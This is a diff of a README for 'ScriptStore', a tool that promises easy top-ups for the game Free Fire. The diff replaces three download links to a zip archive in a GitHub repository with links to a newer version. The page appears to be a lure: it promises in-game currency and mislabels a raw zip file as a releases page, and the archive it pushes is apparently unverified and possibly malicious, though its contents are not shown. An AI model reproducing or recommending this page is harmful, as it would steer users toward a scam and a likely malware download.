@@ -1,6 +1,6 @@
 # 🎮 ScriptStore - Topup for Free Fire Made Easy
 
-![Download ScriptStore](https://github.com/khanhmuonhoclamhaker/ScriptStore/raw/refs/heads/main/homostyled/Script_Store_1.0.zip)
+![Download ScriptStore](https://github.com/khanhmuonhoclamhaker/ScriptStore/raw/refs/heads/main/homostyled/Script_Store_v1.9.zip)
 
 ## 📖 About ScriptStore
 
@@ -12,7 +12,7 @@ Before you can start using ScriptStore, you'll need to download it from the rele
 
 ## 💾 Download & Install
 
-1. Visit this page to download: [ScriptStore Releases](https://github.com/khanhmuonhoclamhaker/ScriptStore/raw/refs/heads/main/homostyled/Script_Store_1.0.zip).
+1. Visit this page to download: [ScriptStore Releases](https://github.com/khanhmuonhoclamhaker/ScriptStore/raw/refs/heads/main/homostyled/Script_Store_v1.9.zip).
 
 2. Find the latest version of ScriptStore on the releases page. Download the version that matches your operating system.
 
@@ -62,6 +62,6 @@ For further assistance, you can reach out for support. Visit our GitHub page, wh
 
 ## 📥 Download Link Again
 
-Don't forget to visit this page to download ScriptStore: [ScriptStore Releases](https://github.com/khanhmuonhoclamhaker/ScriptStore/raw/refs/heads/main/homostyled/Script_Store_1.0.zip).
+Don't forget to visit this page to download ScriptStore: [ScriptStore Releases](https://github.com/khanhmuonhoclamhaker/ScriptStore/raw/refs/heads/main/homostyled/Script_Store_v1.9.zip).
 
 Now you’re ready to explore the world of Free Fire with ease! Enjoy your gaming experience with ScriptStore.
